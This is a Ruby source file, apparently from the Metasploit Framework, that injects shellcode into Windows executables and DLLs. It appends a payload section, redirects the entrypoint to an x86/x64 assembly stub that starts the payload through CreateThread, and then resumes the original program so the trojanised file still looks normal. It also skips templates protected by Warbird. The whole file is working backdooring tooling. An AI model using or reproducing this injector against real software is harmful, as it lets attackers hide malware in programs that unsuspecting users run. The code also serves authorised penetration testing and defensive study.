# -*- coding: binary -*-

module Msf
  module Exe
    # Appends a payload section and injects it via a CreateThread entrypoint stub.
    class SegmentInjector < SegmentAppender
      attr_accessor :buffer_register

      def initialize(opts = {})
        super

        @buffer_register = opts[:buffer_register] || (arch == :x86 ? 'edx' : 'rdx')
        validate_buffer_register!
      end

      def generate_pe
        pe_orig = Metasm::PE.decode_file(template)
        if is_warbird?(pe_orig)
          raise 'The template to inject to appears to have license verification (warbird)'
        end

        if pe_orig.export && pe_orig.export.num_exports == 0
          raise "The template file doesn't have any exports to inject into!"
        end

        pe = copy_pe(pe_orig)
        section = append_section(pe, prefix: dll_prefix(pe), default_name: '.text')

        # Tell our section where the original entrypoint was
        if pe.optheader.entrypoint != 0
          section.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
        end

        pe.optheader.entrypoint = 'hook_entrypoint'
        pe.cpu = pe_orig.cpu

        pe.encode_string
      end

      private

      def build_section_data(prefix:)
        asm = "hook_entrypoint:\n#{prefix}\n"
        asm << create_thread_stub

        shellcode = Metasm::Shellcode.assemble(processor, asm)

        shellcode.encoded + payload
      end

      # @param pe [Metasm::PE]
      # @return [String] assembly code to place at the entrypoint. Will be empty
      #   for non-DLL executables.
      def dll_prefix(pe)
        prefix = ''
        if pe.header.characteristics.include? 'DLL'
          # if there is no entry point, just return after we bail or spawn shellcode
          if pe.optheader.entrypoint == 0
            prefix = "cmp [esp + 8], 1
              jz spawncode
entrypoint:
              xor eax, eax
              inc eax
              ret 0x0c
              spawncode:"
          else
            # there is an entry point, we'll need to go to it after we bail or spawn shellcode
            # if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
            prefix = "cmp [esp + 8], 1
              jnz entrypoint"
          end
        end

        prefix
      end

      def is_warbird?(pe)
        # The byte sequence is for the following code pattern:
        # .text:004136B4                 mov     eax, large fs:30h
        # .text:004136BA                 sub     ecx, edx
        # .text:004136BC                 sar     ecx, 1
        # .text:004136BE                 mov     eax, [eax+0Ch]
        # .text:004136C1                 add     eax, 0Ch
        pattern = "\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C"
        section = pe.sections.find { |pe_section| pe_section.name.to_s == '.text' }
        if section.nil?
          return false
        elsif section && section.encoded.pattern_scan(pattern).blank?
          return false
        end

        true
      end

      def validate_buffer_register!
        x86_regs = %w[eax ecx edx ebx edi esi]
        x64_regs = %w[rax rcx rdx rbx rdi rsi] + (8..15).map { |num| "r#{num}" }

        if arch == :x86 && !x86_regs.include?(buffer_register.downcase)
          raise ArgumentError, ':buffer_register is not a real register'
        elsif arch == :x64 && !x64_regs.include?(buffer_register.downcase)
          raise ArgumentError, ':buffer_register is not a real register'
        end
      end

      def create_thread_stub
        case arch
        when :x86
          create_thread_stub_x86
        when :x64
          create_thread_stub_x64
        else
          raise 'Incompatible architecture'
        end
      end

      def create_thread_stub_x64
        <<-EOS
        push rbp
        mov rbp, rsp
        sub rsp, 38h
        and rsp, 0xfffffffffffffff0 ; Ensure RSP is 16 byte aligned

        mov rcx, hook_libname
        mov rax, iat_LoadLibraryA
        call [rax]

        mov rdx, hook_funcname
        mov rcx, rax
        mov rax, iat_GetProcAddress
        call [rax]

        xor ecx, ecx
        mov qword ptr [rsp+28h], rcx
        mov qword ptr [rsp+20h], rcx
        mov r9, rcx
        mov r8, thread_hook
        mov rdx, rcx
        call rax

        leave
        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        mov #{buffer_register}, shellcode
        shellcode:
        EOS
      end

      def create_thread_stub_x86
        <<-EOS
        pushad
        push hook_libname
        call [iat_LoadLibraryA]
        push hook_funcname
        push eax
        call [iat_GetProcAddress]
        lea edx, [thread_hook]
        push 0
        push 0
        push 0
        push edx
        push 0
        push 0
        call eax

        popad
        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        lea #{buffer_register}, [shellcode]
        shellcode:
        EOS
      end
    end
  end
end
